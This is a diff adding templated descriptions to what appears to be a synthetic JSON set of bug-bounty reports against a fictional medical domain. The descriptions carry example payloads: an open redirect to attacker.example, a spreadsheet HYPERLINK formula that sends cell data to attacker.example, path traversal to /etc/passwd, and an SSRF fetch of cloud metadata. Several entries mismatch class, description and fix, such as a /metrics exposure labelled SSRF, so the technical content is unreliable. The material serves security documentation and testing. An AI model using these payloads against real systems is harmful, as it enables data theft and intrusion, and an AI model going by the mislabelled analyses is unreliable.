+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11233,7 +11316,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://updates.alpenlichtmed.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11337,7 +11421,8 @@
           "offset": "1d 22h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://updates.alpenlichtmed.foo/console/queue`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -11467,7 +11552,8 @@
           "offset": "4d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://updates.alpenlichtmed.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11590,7 +11676,8 @@
           "offset": "14h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://updates.alpenlichtmed.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11718,7 +11805,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.alpenlichtmed.foo/api/v2/documents/`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11850,7 +11938,8 @@
           "offset": "8h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://updates.alpenlichtmed.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -11974,7 +12063,8 @@
           "offset": "7d",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://cloud.alpenlichtmed.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -12098,7 +12188,8 @@
           "offset": "2d 8h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://cloud.alpenlichtmed.foo/export?type=records`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12217,7 +12308,8 @@
           "offset": "3d 16h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenlichtmed.foo/profile`\n- Preconditions: authenticated user: support agent; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12353,7 +12445,8 @@
           "offset": "2d 15h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://updates.alpenlichtmed.foo/api/documents/`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12468,7 +12561,8 @@
           "offset": "8d 4h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://updates.alpenlichtmed.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12605,7 +12699,8 @@
           "offset": "8d 3h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://api.alpenlichtmed.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12709,7 +12804,8 @@
           "offset": "7d 16h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://updates.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12841,7 +12937,8 @@
           "offset": "4d 13h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.alpenlichtmed.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -12989,7 +13086,8 @@
           "offset": "4d 1h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenlichtmed.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13116,7 +13214,8 @@
           "offset": "3d 2h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://cloud.alpenlichtmed.foo/api/v2/documents/`\n- Preconditions: authenticated user: support agent; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13260,7 +13359,8 @@
           "offset": "1d 18h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://cloud.alpenlichtmed.foo/console/queue`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13367,7 +13467,8 @@
           "offset": "2d 2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://updates.alpenlichtmed.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -13538,7 +13639,8 @@
           "offset": "5d 21h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://updates.alpenlichtmed.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Mobile 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13669,7 +13771,8 @@
           "offset": "3d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.alpenlichtmed.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13816,7 +13919,8 @@
           "offset": "8d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.alpenlichtmed.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13960,7 +14064,8 @@
           "offset": "1d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://updates.alpenlichtmed.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -14144,7 +14249,8 @@
           "offset": "8d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://updates.alpenlichtmed.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14292,7 +14398,8 @@
           "offset": "1d 12h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://updates.alpenlichtmed.foo/api/v2/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14419,7 +14526,8 @@
           "offset": "1d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://cloud.alpenlichtmed.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14532,7 +14640,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14680,7 +14789,8 @@
           "offset": "9d 21h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenlichtmed.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14853,7 +14963,8 @@
           "offset": "7d 15h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://updates.alpenlichtmed.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14992,7 +15103,8 @@
           "offset": "7d 14h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://updates.alpenlichtmed.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -15160,7 +15272,8 @@
           "offset": "3d 12h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.alpenlichtmed.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15290,7 +15403,8 @@
           "offset": "5d 9h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
